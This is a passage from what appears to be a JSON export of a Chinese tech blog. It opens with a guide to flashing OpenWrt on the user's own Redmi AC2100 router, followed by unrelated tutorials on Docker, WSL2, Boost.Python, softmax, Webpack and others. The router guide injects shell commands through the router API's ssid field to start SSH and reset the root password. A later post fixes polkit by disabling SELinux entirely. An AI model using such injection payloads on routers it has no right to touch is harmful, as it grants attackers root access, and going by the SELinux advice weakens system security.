`http://192.168.31.1/cgi-bin/luci/;stok=<YOUR-STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B/etc/init.d/dropbear%20start%3B`\n\n其中网址中的`<YOUR-STOK>`需要替换为前面保存的stok值。\n\n\n不出意外的话（三次访问均得到{code: 0}），SSH服务已经打开，但不知道默认的密码是多少，不过还是可以通过web api进行设置。\n\n\n访问以下网址可将root用户的密码修改为admin：\n\n\n`http://192.168.31.1/cgi-bin/luci/;stok=<YOUR-STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B`\n\n\n### 开始正式刷机\n\n\n通过一切你能想到的方法将两个openwrt固件文件下载到路由器系统的/tmp文件夹下（其他文件夹所在分区好像都不可写）。\n\n\n视频中推荐的方法是使用python2的SimpleHTTPServer（这玩意在python3中变成了http.server）通过它迅速在电脑端建立起一个HTTP服务，然后在路由器里wget一下就好了。另外还可以用scp命令将文件直接拷贝到路由器/tmp目录下，也非常滴方便。\n\n\n下载完文件后，在/tmp目录下执行以下几句命令：\n\n\n\n```shell\nmtd write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin kernel1\nmtd write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin rootfs0\n\nnvram set uart_en=1\nnvram set bootdelay=5\nnvram set flag_try_sys1_failed=1\nnvram commit\n```\n\n最后reboot重启系统。等蓝色指示灯再一次亮起，则可以再次通过SSH登录，不过这一次ip地址变成了192.168.1.1，而且没有设定密码。刷机成功的情形：SSH登录时的欢迎信息变成了如下：\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/3bdb9a1c40c87a292c48c60835f600a4.jpg)访问`http://192.168.1.1`，发现什么都没有，这是因为该openwrt固件默认不带web操作界面，路由器WAN口接上网线，成功上网后，通过以下两句命令进行安装，若安装失败，请百度“openwrt换源”。\n\n\n\n```shell\nopkg update\nopkg install luci\n```\n\n接下来在Network/Wireless中将WiFi开启，路由器就可以正常使用了！\n","tags":["OpenWrt","路由器"],"categories":["瞎捣鼓经历"]},{"title":"Docker默认存储路径修改","url":"//blog/5369/","content":"\n随着我们长期使用docker，可能会遇到默认存储路径所在的分区装不下的情况，所以不如提前把默认存储路径改了，放到比较充裕的分区下。\n\n\n这里以Ubuntu为例，先停止docker服务，然后进行以下操作：\n\n修改文件：`/etc/systemd/system/docker.service.d/docker-overlay.conf` (如果没有`docker.service.d`文件夹或`docker-overlay.conf`文件则手动创建)\n\n\n在文件中写入以下内容：\n\n```bash\n[Service]\nExecStart=\nExecStart=/usr/bin/dockerd --graph=\"new_docker_storage_path\" --storage-driver=overlay\n```\n\n将graph参数引号内部分修改为你所希望的docker存储路径，保存退出文件。\n\n\n启动docker服务，通过命令`docker info` 可查看存储路径是否修改成功。\n","tags":["Docker"],"categories":["瞎捣鼓经历"]},{"title":"Polkit服务无法开启的一种解决方法","url":"//blog/5356/","content":"\n今天在CentOS服务器上想使用docker时，发现运行不起来，仔细一看报错内容，大概说是让我检查一下polkit.service有没有正常运作，因此使用命令`systemctl status polkit`进行查看，发现\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/1f17afd91b0a70ae5a9cb7a13fc79b4d.jpg)\n好像确实没有运行起来...，直接运行`systemctl start polkit`妄图开启服务，果不其然失败了。然后我试了好多种方法，也重装了两次polkit，均失败。\n\n\n了解到Polkit是Linux系统中的一个身份认证管理工具，它无法正常工作便会导致一些服务无法启动。经过一番搜索，最后的解决方法如下：\n\n\n修改/etc/selinux/config文件，将SELINUX的值改为disabled，然后运行命令`setenforce 0`使修改生效。这之后就可以正常运行polkit和docker服务了。\n","tags":["Linux"],"categories":["Debug"]},{"title":"WSL2+图形界面配置+CUDA调用","url":"//blog/5313/","content":"\n由于种种原因，我需要一台能调用NVIDIA CUDA的Linux系统机，众所周知，大部分虚拟机由于使用的是虚拟显卡，是没办法调用CUDA的。\n\n然而我既不想装双系统，也不想在白嫖别人的服务器上瞎折腾，一筹莫展之时，偶然了解到Windows 10预览版本为其内置的Linux子系统WSL2增加了CUDA支持，二话不说直接安排一波。\n\n\n## 更新Windows系统\n\n\n首先，需要将Win 10升级到预览版本，打开设置界面选择“更新与安全”，拖至底部可见选项“Windows预览体验计划”，在其中使用自己的Microsoft账户进行申请即可，然后将渠道设置为Dev，该渠道能获取到latest更新版本。\n\n\n稍等片刻，进入Windows更新，若一切正常应该会在这里收到提醒更新的信息，在我操作时的最新版本号为“21343.1000”，然后则需要耐心等待系统更新完全。\n\n\n## 安装WSL2的Ubuntu 18.04 LTS\n\n\n安装WSL2的操作[官方文档](https://docs.microsoft.com/zh-cn/windows/wsl/install-win10)写的比较详细。（其实文档里的操作我都没什么印象，好像很早以前用docker for desktop的时候就已经通过某种其他途径装好了WSL2）\n\n\n然后去Windows应用商店搜索Ubuntu，在弹出的几个选项中选择Ubuntu 18.04 LTS，这里尽量不要选新的20.04版本，反正我试了下发现图形界面跑不起来，而18.04版本没有任何问题。\n\n\n## 安装显卡驱动\n\n\n在WSL2中调用GPU，不需要在虚拟机里面安装显卡驱动，而是在Windows中安装对应的驱动，NVIDIA已推出适用于WSL的CUDA驱动：[入口](https://developer.nvidia.com/cuda/wsl/download)，这里需要根据显卡的型号来进行选择。\n\n\n下载完驱动文件以后，运行之，进行一套菜鸟式安装即可，我没有遇到任何问题。\n\n\n### WSL2中安装CUDA Toolkit\n\n\n进入刚刚前面创建的Ubuntu18.04，执行下面的命令：\n\n```bash\nsudo apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub\nsudo sh -c 'echo \"deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64 /\" > /etc/apt/sources.list.d/cuda.list'\nsudo apt-get update\nsudo apt-get install -y cuda-toolkit-11-0\n```\n\n如果遇到类似于“E: Unable to fetch some archives...”这样的错误，考虑换源。\n\n\n### 检查虚拟机是否支持CUDA\n\n\n简单粗暴，直接安装pytorch，并在console中运行`torch.cuda.is_available()`，如果输出True则可调用CUDA。\n\n\n## 安装图形界面GNOME\n\n\nWindows端采用VcXsrv软件，[下载链接](https://sourceforge.net/projects/vcxsrv/)\n\n\n下载完成后，双击文件夹下的xlaunch.exe文件进入配置界面。\n\n\n第一个界面中只要勾选的不是Multiple windows选项即可：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/61453cb9f58187914c4bcc4ea0613706.png)第二个界面直接下一页，第三个界面中，必须勾选Disable access control：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/d11a0ef2a10ba1ce673c51a8dc52bce7.png)然后依次下一页、完成，屏幕上将会出现一个黑框界面，目前还啥都没有。\n\n\n进入Ubuntu系统，运行命令：\n\n\n\n```bash\nsudo apt install ubuntu-desktop\n```\n\n将安装Ubuntu的默认桌面，即非常赏心悦目的GNOME桌面（不得不说，虽然Ubuntu的软件生态不如Windows，图形界面的功能也没也Windows完善，但在美感上，Windows还是要学习一个，不过话说回来，Win 10预览版的图标风格好像在逐渐Mac化了...）\n\n\n安装完成后，运行：\n\n```bash\nsudo service dbus restart\n```\n\n修改/root/.bashrc文件，添加下面两行：\n\n```bash\nexport DISPLAY=$(grep -m 1 nameserver /etc/resolv.conf | awk '{print $2}'):0.0\nexport XDG_SESSION_TYPE=x11\n```\n\n运行`source /root/.bashrc`使得修改生效，不出意外的话，在刚刚的黑屏幕中已经可以看到图形界面了，在经过美化以后还是相当舒适的，下面贴一下我的桌面：\n\n\n![](https://oss.fyz666.xyz/blogfiles/webp/8b3b7943b841be6576cce2177dce64e3.webp)至此，Ubuntu的图形界面已经安排上了，但国内的软件生态好像不太好，居然连WeChat等常用的即时通讯软件都没有。\n","tags":["Linux","WSL","Ubuntu"],"categories":["瞎捣鼓经历"]},{"title":"如何为WSL虚拟磁盘瘦身","url":"//blog/5309/","content":"\n我们知道虚拟磁盘占用的硬盘空间一般是只增不减的，在长期使用WSL后，虚拟磁盘会变得比较大，而其文件占用其实可能并没有那么多，这个时候可以使用diskpart工具进行压缩。\n\n\n先关闭wsl：\n\n```powershell\nwsl --shutdown\n```\n\n在经历了一些麻烦之后，我现在对不太了解的操作比较小心谨慎，因此在后面的操作之前为磁盘留了备份：\n\n```powershell\nwsl --export name target_file\n```\n\n命令中的`name`可以通过`wsl -l` 命令进行查看。\n\n\n然后运行diskpart命令，进入一个新的窗口，在窗口中运行：\n\n```powershell\nselect vdisk file=\"vhdx文件名\"\ncompact vdisk\n```\n\n稍作等待，即可完成压缩。\n","tags":["WSL"],"categories":["瞎捣鼓经历"]},{"title":"C++程序报0xc000007b错误的一种解决思路","url":"//blog/5299/","content":"\n近期在64位平台编译C++代码，能够成功编译，但运行时遇到错误码为0xc000007b的应用程序无法正常启动错误，用dependency walker分析生成的exe文件发现以下问题：\n\n![](https://oss.fyz666.xyz/blogfiles/webp/4dd07db63d7cf9d284be9f70cdc9b9b7.webp)可以发现很明显出问题的原因在于SysWOW64/ucrtbased.dll这个文件，它是32位的，导致64位编译出来的程序无法运行。但按理说64位平台下编译会优先去System32文件夹下搜索所需的文件，这里大概是System32文件夹下ucrtbased.dll文件缺失所致。\n\n\n因此只需下载到64位的ucrtbased.dll文件，放入System32文件夹下，即可。\n\n可从下面网页下载到所需的文件：\n\n{%link UCRTBASED.DLL,www.dll-files.com,https://www.dll-files.com/ucrtbased.dll.html %}\n","tags":["C++"],"categories":["Debug"]},{"title":"Python、C++混合编程环境搭建及简单示例","url":"//blog/5253/","content":"\nPython以其极高的开发效率著称，而C++作为一种编译型语言，在运行效率上鹤立鸡群。开发效率，我所欲也，运行效率，亦我所欲也，二者可得兼乎？可！\n\n近期在复现DeepMind的Alpla Zero算法时，我面临如下一种需求：既需要快速地把算法实现出来，又要努力保证其运行效率（算法的核心部分：蒙特卡洛树搜索用python实现需要消耗巨量时间），因此开始零基础尝试python、C++混合编程，试图用C++实现蒙特卡洛树搜索部分，并在python中调用（在此之前本人几乎无任何C++编程经验）\n\n\n简单了解了下，这里推荐一下自我感觉API用户友好程度比较高的一个C++库——Boost。但u1s1，这个库的环境搭建过程中坑实在是多，网上资料也并不是特别多，因此在此记录一下。\n\n{% link Boost官网,www.boost.org,https://www.boost.org/ %}\n\n\n由于一般代码都是搬去Linux服务器上运行，因此本文将介绍的是Linux系统下的环境搭建。\n\n\n## 版本说明\n\n\n- 系统版本：Ubuntu20.04，64位（低版本应该也没什么关系，不过必须是64位，否则需要将后面编译的版本都修改为32位）\n- gcc，g++版本9.3.0（稍低一些也可，比如7+应该也够用）\n- Boost 1.75.0（当前最新）\n- Python 3.8.5\n- numpy 1.20.1\n\n其中Python一般要3以上版本，(2版本的情况，会更好装，不再赘述)，numpy的版本需要做好对应，比如1.20.1的版本下编译出来的库，到1.19版本的环境里可能会跑不了。\n\n\n## 安装基本的软件\n\n\n首先去Boost官网上下载最新版本的Boost库，选择Unix版本的[boost_1_75_0.tar.gz](https://boostorg.jfrog.io/artifactory/main/release/1.75.0/source/boost_1_75_0.tar.gz) 下载到Linux系统下，解压。\n\n\n确保环境下已经安装好了Python3，同时该python已安装numpy，找到该python安装目录下的如下两个路径并记住：包含目录，例如/usr/local/python3/include/python3.8；静态库所在目录，例如/usr/local/python3/lib/python3.8/config-3.8-x86_64-linux-gnu。（注：Linux下的静态库即为.a后缀的文件，例如本例中是libpython3.8.a）\n\n\n接下来cd进入前面解压出来的boost_1_75_0目录，准备进行boost静态库文件的编译。\n\n\n上面两段话多次出现了“静态库”这个词，这里插一句为什么要编译“静态库”，而非“动态库”，由于我们的开发环境和运行环境通常不相同，且运行环境随时可能发生变化，动态库对系统的环境依赖程度高，也即，换个环境，动态库引用的动态链接一般就会失效。这显然令人很不爽，如果每次换个运行环境都要搭一遍环境，可太难顶了，而静态库则没有这个问题。\n\n\n在boost_1_75_0目录下，运行以下命令：（下面的命令欲知更多参数细节或有个性化的需求请移步官方文档）\n\n```bash\n./bootstrap.sh --with-libraries=python --with-python-version=3.8 --with-python-root=/usr/local/python3 include=/usr/local/python3/include/python3.8 --with-python=/usr/local/python3/bin/python3.8  --with-toolset=gcc --prefix=/usr/local\n```\n\n其中参数指定安装库为`boost-python`（boost库有很多模块，这里只安装python模块，若不指定，则默认全装，暂时似乎没有必要），指定编译工具为gcc，且安装路径在`/usr/local`下。中间几个参数分别对应了python的版本、根目录、包含目录及解释器所在目录。\n\n\n上面命令跑完后，当前目录下会出现名为b2的可执行文件，接下来执行以下命令：\n\n```bash\n./b2 cflags='-fPIC' cxxflags='-fPIC' address-model=64\n```\n\n其中比较重要是的cflags及cxxflags，均需要设置为'fPIC'，可以用于生成位置无关的代码，使代码在加载到内存时使用相对地址。若不加这两条参数，后面在编译生成目标动态库时会出问题。address-model参数默认为64，可指定生成64位或32位的库文件。\n\n\n最后执行\n\n```bash\n./b2 install\n```\n\n接下来坐等程序运行完即可。运行完后，检查目录/usr/local/lib下是否有以下这些文件： \n\n\n- libboost_numpy38.so\n- libboost_python38.a\n- libboost_python38.so.1.75.0\n- libboost_numpy38.a\n- libboost_numpy38.so.1.75.0\n- libboost_python38.so\n\n之所以有.so动态库文件生成是因为前面并没有指定动态或静态，默认参数下动静态库都会编译，可按需使用。\n\n\n再检查目录`/usr/local/include`下是否存在boost文件夹，若存在，一般即安装成功。\n\n\n最后，需要设置几个永久环境变量，如下：\n\n\n- `BOOST_LIB=/usr/local/lib`\n- `CPLUS_INCLUDE_PATH=/usr/local/python3/include/python3.8:/usr/local/include/boost`\n\n如果你成功进行到了这一步，那么恭喜你，boost环境应该已经安装成功了，接下来只要写一个简单的hello world程序编译一下即可！\n\n\n## 一个简单的demo\n\n\n### 编写.cpp文件并编译为.so文件\n\n\nhello.cpp\n\n```cpp\n#include <iostream>\n#include <boost/python.hpp>\nusing namespace std;\nusing namespace boost::python;\n\nvoid greet(const char *name) {\n\tcout << \"Hello, \" << name << endl;\n}\nBOOST_PYTHON_MODULE_INIT(hello) {\n\tdef(\"greet\", greet);\n}\n```\n\n在当前路径下运行下面的编译命令：\n\n```bash\ng++ -shared -fPIC -lm -pthread -O3 -std=c++11 -march=native -Wall -funroll-loops -Wno-unused-result hello.cpp -o hello.so /usr/local/lib/libboost_python38.a /usr/local/lib/libboost_numpy38.a -I/usr/local/python3/lib/python3.8/config-3.8-x86_64-linux-gnu\n```\n\n等待数秒即可在同目录下生成hello.so文件，不出意外，该文件可以被python3导入使用。\n\n\n针对上面又臭又长的编译命令，我们其实可以做一个makefile，如下：\n\n```makefile\nPYTHON_VERSION = 3.8\nINPUT = hello.cpp\nTARGET= hello\n\nCFLAGS = -shared -fPIC -lm -pthread -O3 -std=c++11 -march=native -Wall -funroll-loops -Wno-unused-result\n\nPYTHON_LIB_PATH = /usr/local/python3/lib/python$(PYTHON_VERSION)/config-3.8-x86_64-linux-gnu\nBOOST_PYTHON_STATIC_LIB = $(BOOST_LIB)/libboost_python38.a\nBOOST_NUMPY_STATIC_LIB = $(BOOST_LIB)/libboost_numpy38.a\n\n$(TARGET).so: $(INPUT)\n        g++ $(CFLAGS) $(INPUT) -o $(TARGET).so $(BOOST_PYTHON_STATIC_LIB) $(BOOST_NUMPY_STATIC_LIB) -I$(PYTHON_LIB_PATH)\n```\n\n之后通过make命令即可进行编译。文件中的各种路径请自行比对修改。如遇到\n\n```plaintext\nmakefile:13: *** missing separator (did you mean TAB instead of 8 spaces?).\n```\n\n这样的报错，则只需将最后g++前面的8个空格换成Tab。\n\n\n### 在python中导入使用\n\n\n将hello.so移到其他无boost python环境的Linux系统下，安装好与之前相同版本的python和numpy，尝试导入与使用，若未得到以下结果，则~~意味着前面所有的努力都白费了~~需要再仔细看一下各项路径的配置及各种环境的版本！\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/ac47ceea3b21d6d8c209c8ee670aeeaf.png)另外Boost Python库同样支持在C++程序中调用python脚本，鉴于暂时无这方面的需求，我并没有尝试。\n","tags":["Python","Boost","C++"],"categories":["瞎捣鼓经历"]},{"title":"浅谈Softmax与Cross Entropy Loss","url":"//blog/5174/","content":"\n在机器学习的多分类任务中，经常听到这么两个名词：Softmax与交叉熵损失函数（Cross Entropy Loss），另外还有一个Sigmoid函数也经常出现，那么这几个东西究竟有什么联系呢？\n\n## Softmax\n\n\n这里先顺便提一句Sigmoid，它与Softmax也有一点关系。我最先听说Sigmoid函数是在逻辑斯蒂回归模型中，这是个二分类任务中常用的经典模型。Sigmoid函数长这样：\n\n\n$$\\sigma(z)=\\frac{1}{1+e^{-z}}$$\n\n\n它将实数域$\\mathbb{R}$映射为(0,1)区间，特殊地将0映射为0.5，那么我们在逻辑斯蒂回归中使用的决策方法就是计算一下$\\sigma(\\mathbf{\\omega}^T\\mathbf{x}+b)$的值，从而得到$\\mathbf{x}$属于正类的概率值，进而进行预测判断。\n\n\n而Softmax则是下面这样一个多元向量值函数：\n\n\n$$a_i=\\frac{e^{z_i}}{\\sum_{j=1}^Ne^{z_j}},\\quad i=1,2,\\dots,N$$\n\n\n显然，一定有$\\sum_{i=1}^Na_i=1$。在N分类任务中，常使用这个函数作为神经网络最末层的激活函数（该层激活前的N个节点即分别为函数的自变量$z_1,z_2,\\dots,z_N$），以得到属于各个类别的概率值。\n\n\n由于神经网络使用梯度下降进行训练，若用Softmax作为激活函数，则免不了对这个函数进行求导，下面先给出该函数的导数（由于这是个多元向量值函数，“导数”准确而言应该是Jacobian）。\n\n\n一般地，我们对$\\forall i,j$计算$\\frac{\\partial a_i}{\\partial z_j}$。\n\n\n$$\\begin{aligned}\\frac{\\partial a_i}{\\partial z_j}&=\\frac{\\partial \\frac{e^{z_i}}{\\sum e^{z_k}}}{\\partial z_j}\\\\&=\\frac{\\frac{\\partial e^{z_i}}{\\partial z_j}\\sum e^{z_k}-e^{z_j}e^{z_i}}{(\\sum e^{z_k})^2}\\\\&=\\left\\lbrace\\begin{aligned}&-\\frac{e^{z_j}e^{z_i}}{(\\sum e^{z_k})^2}=-a_ia_j,\\quad i\\ne j\\\\ &\\\\&\\frac{e^{z_i}\\sum e^{z_k}-e^{2z_i}}{(\\sum e^{z_k})^2}=a_i(1-a_i),\\quad i=j\\end{aligned}\\right.\\end{aligned}$$\n\n\n以上就是Softmax的定义与其微分性质，那么特殊地，二元情形下的Softmax有以下形式：\n\n\n$$\\left\\lbrace\\begin{aligned}&a_1=\\frac{e^{z_1}}{e^{z_1}+e^{z_2}}=\\frac{1}{1+e^{-(z_1-z_2)}}\\\\&\\\\&a_2=\\frac{e^{z_2}}{e^{z_1}+e^{z_2}}=\\frac{e^{-(z_1-z_2)}}{1+e^{-(z_1-z_2)}}\\end{aligned}\\right.$$\n\n\n咦，这不就是Sigmoid吗？其实Sigmoid可以说就是Softmax的二元退化形式。\n\n\n## Cross Entropy Loss\n\n\n单个样本的交叉熵损失函数定义如下：\n\n\n$$E=-\\sum_{i=1}^N y_ilog(a_i)$$\n\n\n其中$y_1,y_2,\\dots,y_N$其实是该样本的标签，其为一个one-hot向量，而$a_i,a_2,\\dots,a_N$是神经网络经过Softmax之后的输出值。定义这么个损失函数究竟有什么好处？一方面，优化交叉熵等价于优化数学里的另一个东西，被称为K-L散度，而后者可以衡量两个概率分布之间的距离，多分类问题本质上就是一个概率分布的优化问题，因此这样一个损失函数在多分类问题上有优良的表现效果，收敛速度更快，而还有一方面，其实就是因为该损失函数结合Softmax进行梯度运算，将非常的方便，如下：\n\n\n接下来，我们结合链式法则来计算$E$对$\\mathbf{z}$的导数（梯度）：\n\n\n$$\\frac{\\partial E}{\\partial \\mathbf{z}}=(\\frac{\\partial\\mathbf{a}}{\\partial\\mathbf{z}})^\\mathrm{T}\\frac{\\partial E}{\\partial \\mathbf{a}}$$\n\n\n其中$\\frac{\\partial\\mathbf{a}}{\\partial\\mathbf{z}}$前面已经算过了，它是：\n\n\n$$\\begin{bmatrix}a_1(1-a_1)&-a_1a_2&\\dots&-a_1a_N\\\\-a_2a_1&a_2(1-a_2)&\\dots&-a_2a_N\\\\ \\vdots&\\vdots&\\ddots&\\vdots\\\\-a_Na_1&-a_Na_2&\\dots&a_N(1-a_N)\\end{bmatrix}$$\n\n\n然后计算$\\frac{\\partial E}{\\partial\\mathbf{a}}$：\n\n\n$$\\frac{\\partial E}{\\partial\\mathbf{a}}=\\begin{bmatrix}-\\frac{y_1}{a_1}\\\\-\\frac{y_2}{a_2}\\\\\\vdots\\\\-\\frac{y_N}{a_N}\\end{bmatrix}$$\n\n\n将上面两个矩阵相乘得到：\n\n\n$$\\frac{\\partial E}{\\partial \\mathbf{z}}=\\begin{bmatrix}-y_1+\\sum{y_ia_1}\\\\-y_2+\\sum{y_ia_2}\\\\\\vdots\\\\-y_N+\\sum{y_ia_N}\\end{bmatrix}$$\n\n\n注意这里$\\mathbf{y}$是样本的标签，它是个one-hot向量，因此一定有$\\sum_{i=1}^Ny_i=1$\n\n\n代入上面的梯度表达式，就有：\n\n\n$$\\frac{\\partial E}{\\partial \\mathbf{z}}=\\begin{bmatrix}a_1-y_1\\\\a_2-y_2\\\\\\vdots\\\\a_N-y_N\\end{bmatrix}=\\mathbf{a}-\\mathbf{y}$$\n\n\n这就牛逼了呀，这个损失函数的选取将原本复杂的一批的求梯度运算转化为了一次减法运算，也正是这一关系，将Softmax与交叉熵损失函数结合起来，成为密不可分的一对。\n","tags":["神经网络"],"categories":["学习笔记","机器学习"]},{"title":"Webpack配置Vue项目文件的读取解析规则","url":"//blog/5162/","content":"\nVue项目中使用webpack对文件进行打包时，由于.vue文件的特殊性，webpack一般无法正常对这类文件进行解析，我们可以通过以下方法对webpack进行配置：\n\n打开`webpack.config.js`文件，在`module.exports`中加上以下内容：\n\n```js\nmodule: {\n  rules: [\n    {\n      test: /.css$/,\n      use: [ 'css-loader', 'style-loader' ]\n    },\n    {\n      test: /.vue$/,\n      use: [ 'vue-loader' ]\n    }\n  ]\n},\n```\n\n当然仅仅这样添加是没有用的，我们还需要安装`css-loader`、`style-loader`、`vue-loader`与`vue-template-compiler`：\n\n```bash\nnpm install css-loader style-loader vue-loader vue-template-compiler --save-dev\n```\n\n安装完以后运行webpack命令，若产生报错，在确保文件语法无错误的情况下，可以打开`package.json`文件查看一下`css-loader`、`style-loader`与`vue-loader`三者的版本，将版本降低一些即可，我使用的版本配置是：\n\n```json\n\"css-loader\": \"^3.3.0\",\n\"style-loader\": \"^1.0.0\",\n\"vue-loader\": \"^13.0.0\"，\n```\n\n修改完版本之后运行`npm install`即可让配置生效。\n\n\n对于其他类型的文件，一般而言也可以下载到对应的loader，按以上方法进行配置即可。\n","tags":["Web前端","npm","Vue","Webpack","NodeJS"],"categories":["瞎捣鼓经历"]},{"title":"如何应用Webpack来运行Vue项目","url":"//blog/5158/","content":"\nVue有多种导入方式，最常见的非模块化导入就是直接往网页里插入一个诸如这样的script标签：`<script src=\"https://cdn.jsdelivr.net/npm/vue/dist/vue.js\"></script>`\n\n但现在项目中一般看不见这种使用方法了，而大多使用模块化的导入方式。\n\n\n但这些模块化导入命令的语法非浏览器所认可，直接在JS代码中使用会报错，而Webpack的作用简单而言就是将浏览器看不懂的代码转化为浏览器看得懂的代码。\n\n\n## 简单创建一个web项目\n\n\n首先创建一个web项目的文件夹（不妨命名为web），在其下创建一个index.html作为web项目的入口文件，再创建两个文件夹：src与dist，其中src用于存放开发过程中的源码，而dist用于存放项目发布时的代码。进入src文件夹，随意创建一个index.js作为JS入口文件。\n\n\n以下所有操作都在web文件夹下进行。\n\n\n## 初始化npm\n\n\n依赖于Node.js环境\n\n```bash\nnpm init\n```\n\n该命令会在当前路径生成一个`package.json`\n\n\n## 安装Webpack\n\n\n全局安装：\n\n```bash\nnpm install webpack -g\n```\n\n局部安装：\n\n```bash\nnpm install webpack --save-dev\n```\n\n### 配置Webpack\n\n\n在web文件夹下创建一个webpack.config.js文件，写入以下内容：\n\n```js\nconst path = require('path')\n\nmodule.exports = {\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname ,'dist'),\n    filename: 'bundle.js'\n  }\n}\n```\n\nentry定义为JS入口文件的路径，output定义为webpack打包文件的目标路径。\n\n\n## 安装Vue\n\n\n执行命令：\n\n```bash\nnpm install vue --save\n```\n\n执行完毕后，当前文件夹下即出现一个新的文件夹：node_modules\n\n\n## 正式在项目中使用Vue\n\n\n举个简单的例子：\n\n`./src/index.js`\n\n```js\nimport Vue from 'vue'\nconst app = new Vue({\n  el: '#app',\n  template: `\n    <div>\n\t<h2>{{message}}</h2>\n    </div>\n  `,\n  data: function(){\n    return{\n      message: 'hello world'\n    }\n  }\n})\n```\n\n./index.html\n\n\n\n```markup\n<!DOCTYPE html>\n<html>\n<head>\n\t<title></title>\n</head>\n<body>\n    <div id=\"app\">\n    </div>\n</body>\n<script src=\"./src/index.js\"></script>\n```\n\n然后直接在浏览器中访问index.html文件，但网页上啥都没有，打开console发现一句报错：`Uncaught SyntaxError: Cannot use import statement outside a module`。这其实就是因为浏览器无法理解`import Vue from 'vue'`这种模块化的导入语句。\n\n\n这个时候就要用到webpack了，我们在命令行执行命令：\n\n```bash\nwebpack\n```\n\n没错就这么简单，这是因为命令必需的参数我们已经预先在webpack.config.js中定义过了。\n\n\n接下来修改./index.html最后一行为：\n\n```markup\n<script src=\"./dist/bundle.js\"></script>\n```\n\n此时打开网页，仍有一行报错：\n\n```raw\n[Vue warn]: You are using the runtime-only build of Vue where the template compiler is not available....\n```\n\n这是因为默认导入的Vue是来自runtime-only的版本，该版本不支持代码中的template属性，对于这个问题，我们只需要修改`webpack.config.js`\n\n\n在`module.exports`中添加一项与output并列的内容：\n\n```js\nresolve: {\n  alias: {\n    'vue$': 'vue/dist/vue.esm.js'\n  }\n}\n```\n\n再次执行命令`webpack`后，访问网页即可看到hello world字样。\n","tags":["npm","Vue","Webpack","NodeJS","前端"],"categories":["瞎捣鼓经历"]},{"title":"npm源修改","url":"//blog/5156/","content":"\n在使用npm安装项目时，默认源在国外，导致速度贼慢甚至安装失败，这时可以通过以下命令修改源：\n\n{%tabs tab1%}\n\n<!-- tab 临时修改 -->\n\n```bash\nnpm --registry https://registry.npm.taobao.org install xxx\n```\n\n<!-- endtab -->\n\n<!-- tab 永久修改 -->\n\n```bash\nnpm config set registry https://registry.npm.taobao.org\n```\n\n<!-- endtab -->\n\n{% endtabs %}\n\n通过以下命令查看是否修改成功：\n\n```bash\nnpm config get registry\n```","tags":["npm"],"categories":["学习笔记"]},{"title":"LaTeX章节编号样式自定义","url":"//blog/5130/","content":"\n在使用Latex写文章时，经常不满足于默认的章节编号样式，故有自定义编号样式的需求，例如需要改成中文的编号等等。本文总结了一些常见编号样式的修改方法。\n\n\n```latex\n%section\n%修改编号为数字\n\\renewcommand\\thesection{\\arabic{section}}\n%修改编号为小写字母\n\\renewcommand\\thesection{\\alph{section}}\n%修改编号为大写字母\n\\renewcommand\\thesection{\\Alph{section}}\n%修改编号为中文数字(需要导入ctex宏包)\n\\renewcommand\\thesection{\\chinese{section}}\n```\n\n其他诸如`subsection`之类的同理操作即可。\n","tags":["LaTeX"],"categories":["学习笔记"]},{"title":"WordPress接入支付宝登录","url":"//blog/5079/","content":"\n搞了半天才发现微信开放平台不让个人号申请接入，因此我转战阿里系平台，花了一天时间接入了支付宝用户oauth接口。\n\n支付宝开放平台的文档写的很详细，但仍有一些细节不到位，若开发者没什么基础，接入会比较困难。\n\n\n其实支付宝开放平台提供了许多已经写好的SDK，但这SDK文档不详细，我懒得学，因此我自己写了一个脚本用以接入支付宝oauth。\n\n\n代码见[此gist](https://gist.github.com/windshadow233/0982ddf0b208285f9b349cb0d85d848e)，其中包含两个文件：`RSA2.php`与`alipay.php`。\n\n\n接入方法如下：\n\n\n首先在[支付宝开放平台](https://open.alipay.com/)申请一个网页应用，（选择自研服务->网页&移动应用），申请成功后会获取一个APPID，将这个APPID填入`alipay.php`文件开头的`define('Ali_APPID','');`当中。\n\n\n支付宝接口的安全性体现在其每次发起请求必须附带一个签名（sign），验签通过即确保参数未被篡改，接下来我将粗略讲一下这个签名是怎么生成的。\n\n\n首先在支付宝开放平台进入你的应用，选择应用信息，在开发信息栏目中可以看到一行“接口加签方式”，点击进入。\n\n![](https://oss.fyz666.xyz/blogfiles/png/1021c67f8641e44709c0d36f24d13709.png)\n作为普通开发者，这里选择加签模式为“公钥”，加签模式为“SHA256withRSA”，接下来可以用他提供的[支付宝密钥生成器](https://docs.open.alipay.com/291/106097/)来生成一对密钥，然后把公钥复制进去保存设置即可。\n\n\n接下来，将公钥字符和私钥字符按注释的方法填入`RSA2.php`文件，这就完成了密钥的配置。\n\n\n至于加签的方式，支付宝开放平台的文档中以一句话带过，这里我写了一个函数用以实现加签过程：\n\n```php\nfunction get_sign($args){\n\tksort($args);\n\t$str_args = array();\n\tforeach ($args as $key => $value){\n\t    array_push($str_args, $key. '='. $value);\n\t}\n\t$str_args = implode('&', $str_args);\n\t$rsa2 = new Rsa2();\n\t$sign = $rsa2->createSign($str_args);\n\treturn $sign;\n}\n```\n\n这里参数在拼接的时候不需要进行urlencode，但在后面拼接URL的时候，必须进行urlencode，否则会请求失败。\n\n\n接下来将文件上传服务器，在网站的根目录下创建一个oauth文件夹，将这两个文件都上传到oauth文件夹下即可。\n\n\n最后在网站插入一个支付宝的logo，点击跳转到`http(s)://域名/oauth/alipay.php?rurl`。至此，WordPress已成功接入支付宝登录。\n","tags":["WordPress","PHP","Oauth"],"categories":["博客相关"]},{"title":"PHP的openssl模块怎么开启","url":"//blog/5077/","content":"\n昨天在本地跑PHP代码时，遇到一句报错，相信不少朋友们也遇到过：\n\n\n```plaintext\nPHP Fatal error:  